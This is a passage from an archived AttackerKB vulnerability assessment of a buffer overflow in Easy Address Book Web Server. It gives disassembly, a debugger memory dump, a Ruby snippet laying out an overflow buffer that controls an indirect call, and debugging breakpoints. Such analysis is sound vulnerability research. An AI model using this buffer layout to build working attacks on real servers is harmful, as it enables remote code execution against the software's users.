---
title: Easy Adress Book Web Server Buffer Overflow
author: wchen-r7
score: 1
topic_attacker_value: 0
topic_exploitability: 0
created: '2019-09-12T18:07:15.072965'
revision_date: '2020-02-13T17:12:18.705594'
assessment_id: c50c5aa2-b9c5-473a-95ae-87ced107cf61
topic_id: d83c6dff-70df-421b-beba-cdd1d7776aff
topic_short_id: bJggqZJGvK
topic_slug: easy-adress-book-web-server-buffer-overflow
akb_topic_url: https://attackerkb.com/topics/bJggqZJGvK/easy-adress-book-web-server-buffer-overflow
akb_assessment_url: https://attackerkb.com/topics/bJggqZJGvK/easy-adress-book-web-server-buffer-overflow#c50c5aa2-b9c5-473a-95ae-87ced107cf61
---

# Easy Adress Book Web Server Buffer Overflow

*Assessment by wchen-r7, archived from [AttackerKB](https://attackerkb.com/topics/bJggqZJGvK/easy-adress-book-web-server-buffer-overflow#c50c5aa2-b9c5-473a-95ae-87ced107cf61).*

---

-
```

In addition, ```var_DE64``` is used to store the ```UserID``` information by a simple memcpy routine:

```
.text:0040F2D7 mov     eax, ecx
.text:0040F2D9 mov     esi, edi
.text:0040F2DB mov     edi, edx
.text:0040F2DD push    ebx
.text:0040F2DE shr     ecx, 2
.text:0040F2E1 rep movsd
```

If ```UserID``` has a value of "AAAA", in a debugger the buffers would look like this:

```
01EEB494   41414141  AAAA
01EEB498   00000000  ....
01EEB49C   00000000  ....
01EEB4A0   00000000  ....
01EEB4A4   00000000  ....
01EEB4A8   00000000  ....
01EEB4AC   00000000  ....
01EEB4B0   00000000  ....
01EEB4B4   00000000  ....
01EEB4B8   00000000  ....
01EEB4BC   00000000  ....
01EEB4C0   00000000  ....
01EEB4C4   00000000  ....
01EEB4C8   00000000  ....
01EEB4CC   00000000  ....
01EEB4D0   00000000  ....
01EEB4D4   01000101  .
01EEB4D8   016EE168  hán  ASCII "2.60 ,MyDB Engine,Copyright_2002 MGH Software Inc."
01EEB4DC   00518470  p„Q.  abws.00518470
01EEB4E0   00518470  p„Q.  abws.00518470
01EEB4E4   004F2F7C  |/O.  abws.004F2F7C
01EEB4E8   00000250  P..
```

In the above example, the range from 01EEB494 to 01EEB4D0 is exactly 64 bytes, this is our
```var_DE64``` buffer. Right below that is our ```var_DE24```, which is what ESI points to
at the time of the crash. At the 0x10th byte of ESI is where EDX is, which is used by the
```CALL DWORD [edx+28h]``` instruction. The following code represents this:

```ruby
buf = "A" * 64         # 64 bytes for var_DE64
buf << "BBBB"          # We start overwriting var_DE24 buffer here
buf << "C" * (16-4)    # Padding for [ESI+10h] so the 16th DWORD is our DDDD
buf << "DDDD"          # EDX (which will be used by the CALL DWORD [edx+28h] instruction)
buf << "E" * (4 * 100) # Extra padding so we can see the overflow better
```

Since the overflow ends up writing an object in ```var_DE24``` and gets used by the function,
this results a type confusion (a string being treated as an object).

# Breakpoints

* The first breakpoint is the alloca_probe call
* The second breakpoint is the destination buffer for the mempcy that copies the UserID value to ```var_DE64```
* The third is the beginning of the vulnerable function

```
0:006> bl
 0 e 0040f10a     0001 (0001)  0:**** abws+0xf10a
 1 e 0040f2db     0001 (0001)  0:**** abws+0xf2db
 2 e 0040f0f0     0001 (0001)  0:**** abws+0xf0f0
 ```
